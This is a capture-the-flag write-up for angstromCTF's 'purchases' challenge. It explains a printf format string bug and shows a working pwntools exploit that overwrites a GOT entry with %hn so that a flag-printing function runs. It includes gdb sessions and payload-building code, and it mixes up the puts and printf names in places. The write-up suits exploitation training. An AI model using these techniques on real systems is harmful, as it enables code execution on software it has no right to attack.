## angstromCTF: purchases
>This grumpy shop owner won't sell me his flag! At least I have his source.

##### *tl;dr: format string vulnerability to overwrite printf GOT*
### Source Code Analysis
#### As with the other pwn challenges, the source codes are given - making the vulnerability finding process much easier:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

int main() {
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	char item[60];
	printf("What item would you like to purchase? ");
	fgets(item, sizeof(item), stdin);
	item[strlen(item)-1] = 0;

	if (strcmp(item, "nothing") == 0) {
		printf("Then why did you even come here? ");
	} else {
		printf("You don't have any money to buy ");
		printf(item);
		printf("s. You're wasting your time! We don't even sell ");
		printf(item);
		printf("s. Leave this place and buy ");
		printf(item);
		printf(" somewhere else. ");
	}

	printf("Get out!\n");
	return 0;
}
```
#### Taking a quick look at the source code, we quickly spot the vulnerability which is the printf function being called without format specifiers (`printf(item);`). What this means is that printf interprets buffer as a format string, and parses any formatting instructions it may contain - thus leading to code executions and memory leaks. 
#### A format string exploit could be executed when the application doesn’t properly validate the submitted input. For example, if a format string parameter, like %x, is inserted into the posted data, the string is parsed by the format function, and the conversion specified in the parameters is executed. However, the format function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack. 
#### To have a better understanding of how we will exploit this challenge, here are quick links to `LiveOverflow`'s videos on format string exploitation and a Team (666)'s writeup I followed the format for mine:
> [A simple Format String exploit example - bin 0x11](https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18)

> [Global Offset Table (GOT) and Procedure Linkage Table (PLT) - bin 0x12](https://www.youtube.com/watch?v=kUk5pw4w0h4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=19)

> [Format String Exploit and overwrite the Global Offset Table - bin 0x13](https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20)

> [Adapting the 32bit exploit to 64bit for format4 - bin 0x27](https://www.youtube.com/watch?v=_lO_rwaK_pY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=42)

> [(666) Writeup for Purchases](https://github.com/Hong5489/AngstormCTF2019/tree/master/purchases)


### Brainstorming
#### Examining the source code again, we see that there is is a flag function which prints out the flag for us. Taking a note of this, our exploit plan will be to take advantage of the format string vulnerability to overwrite puts' `GOT address` to the flag function - thus making puts execute what flag does. To test if our plan would work, we try it out in gdb. We set a breakpoint before the puts call, then change the it's GOT address to the address of flag:
```
$ gdb ./purchases
	gdb-peda$ disas printf
	Dump of assembler code for function puts@plt:
	0x0000000000401030 <+0>:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018
	0x0000000000401036 <+6>:	push   0x0
	0x000000000040103b <+11>:	jmp    0x401020
	End of assembler dump..
	
	gdb-peda$ p flag
	$1 = {<text variable, no debug info>} 0x4011b6 <flag>
	
	gdb-peda$ disas main
	[...]
	0x000000000040131a <+337>:	call   0x401080 <printf@plt>
	0x000000000040131f <+342>:	lea    rdi,[rip+0xdda]        # 0x402100
	0x0000000000401326 <+349>:	call   0x401030 <puts@plt>
	0x000000000040132b <+354>:	mov    eax,0x0
	[...]
	
	gdb-peda$ break *0x0000000000401326
	Breakpoint 1 at 0x401326
	
	gdb-peda$ r
	What item would you like to purchase? everything
	You don't have any money to buy everythings. You're wasting your time! We don't even sell everythings. Leave this place and buy everything somewhere else. 
	Breakpoint 1, 0x0000000000401326 in main ()
	
	gdb-peda$ set {int}0x404018=0x4011b6
	
	gdb-peda$ x/ 0x404018
	0x404018:	0x00000000004011b6
	
	gdb-peda$ c
	Continuing.
	[New process 11726]
	process 11726 is executing new program: /bin/dash
	Warning:
	Cannot insert breakpoint 1.
	Cannot access memory at address 0x401326
```
#### To talk you through what just happened, first we disassembled the puts function and saw that the first thing it does is to jump to it's GOT entry address, `0x404018`. Now that we have the GOT address for puts, we printed out the address for flag, set a breakpoint before our puts call. After we hit the breakpoint, we set the contents of the GOT address to flag's address, then we validate if we have successfully overwriten the value. Continuing the process, the binary executes /bin/dash and proceeds to call the flag function.

### Exploitation
#### Since we have confirmed that our plan works theoretically, it's time to craft the exploit. For this to work, we need to find out which offset we can find our buffer. We can automate this using a short script:
```python
from pwn import *

#: Connect to challenge server
p = process('./purchases')
print(p.recv())

#: Exploit code
exploit = 'AAAABBBB' + ' %p ' * 10

#: Send payload
p.sendline(exploit)
print(p.recv())
```
#### Running the script, we get this result:
```
What item would you like to purchase? 
You don't have any money to buy AAAABBBB 0x7ffd0237f380  0x7f5f5d2d08c0  (nil)  0x20  0x7f5f5d4d74c0  0xb  0x3e85d2d6660  0x4242424241414141  0x2070252020702520  0x2070252020702520 s. You're wasting your time! We don't even sell AAAABBBB 0x7ffd0237f380  0x7f5f5d2d08c0  (nil)  0x30  (nil)  0xb  0x3e85d2d6660  0x4242424241414141  0x2070252020702520  0x2070252020702520 s. Leave this place and buy AAAABBBB 0x7ffd0237f380  0x7f5f5d2d08c0  (nil)  0x1c  (nil)  0xb  0x3e85d2d6660  0x4242424241414141  0x2070252020702520  0x2070252020702520  somewhere else. Get out!
```
#### The input we provided has hex values of 0x41 and 0x42, and searching them in the output, we see that our buffer can be found at offset 8. Modifying the script we used earlier, we can verify this by only printing out the 8th offset from the leak. 
```python
#: Exploit code
exploit = 'AAAABBBB' + ' %8$p'
```
#### Which results to:
```
You don't have any money to buy AAAABBBB 0x4242424241414141s. You're wasting your time! We don't even sell AAAABBBB 0x4242424241414141s. Leave this place and buy AAAABBBB 0x4242424241414141 somewhere else. Get out!
```
#### Since we have our offset, let's modify our code and then replace the junk we input into the address we want to overwrite - puts GOT. Afterwhich we run it to see the results.
```python
#: Exploit code
puts_GOT = 0x404018
exploit = p64(puts_GOT) + ' %8$p'
```
```
You don't have any money to buy @s. You're wasting your time! We don't even sell @s. Leave this place and buy @ somewhere else. Get out!
```
#### Hmmm. There seems to be a problem with our input, it somehow stops at two bytes when there should be more. The problem with this is that `p64(puts_GOT)` contains null bytes, that's why it gets terminated. To bypass this, we need to put it after the format specifier and remember to remove the null bytes to have a clearer picture of the buffer:
```python
#: Exploit code
puts_GOT = 0x404018
exploit = '%8$p ' + p64(puts_GOT)[:3]
```
```
You don't have any money to buy 0x4040182070243825 @@s. You're wasting your time! We don't even sell 0x4040182070243825 @@s. Leave this place and buy 0x4040182070243825 @@ somewhere else. Get out!
```
#### We've printed out the address correct, but the buffer seems wrong. We only need the address for puts' GOT to be in it. So we pad our format specifier with spaces, pushing our target buffer at a higher offset. We need to keep in mind that the addresses will be 8 bytes each since its a 64-bit binary. This is what it looks like (from (666)'s writeup):
```
Before:
[      8th argument    ][          9th argument        ]
[%][8][$][p][40][40][40][00][00][00][00][00]...

After:
[      8th argument    ][          9th argument        ]
[%][8][$][p][ ][ ][ ][ ][40][40][40][00][00][00][00][00]
```
#### After a bit of playing around with the amount of spaces, we get the results we want at offset 10 with a padding of 16 spaces. Take note of the number of spaces, it'll be important for later. Now we need to overwrite puts' GOT entry. We'll need to provide around 4198838 characters to overwrite the GOT address to our desired one, but that won't do since the buffer is only 60 bytes in size. We can bypass this by using another format specifier that prints out an assigned number of spaces. And to write to the amount of spaces to the GOT address, we use the `%hn` specifier. Now to craft our final exploit, we need to remember that the format specifiers must be 16 in length for the exploit to work:
##### exploit.py
```python
from pwn import *

#: Connect to challenge server
# HOST = 'shell.actf.co'
# PORT = 19011
# p = remote(HOST,PORT)
p = process('./purchases')
print(p.recvuntil('purchase? '))

#: Exploit code
offset = 8
printf_got = 0x404018
flag_plt = 0x4011b6

payload = '%{}x%10$hn '.format(str(flag_plt))
exploit = payload + p64(printf_got)[:3]

#: Send payload
p.sendline(exploit)
p.interactive()
```
#### Run the script to get the flag!
```
$ python exploit.py
[...]
ea27fc00 @@ somewhere else. 
actf{limited_edition_flag}
```


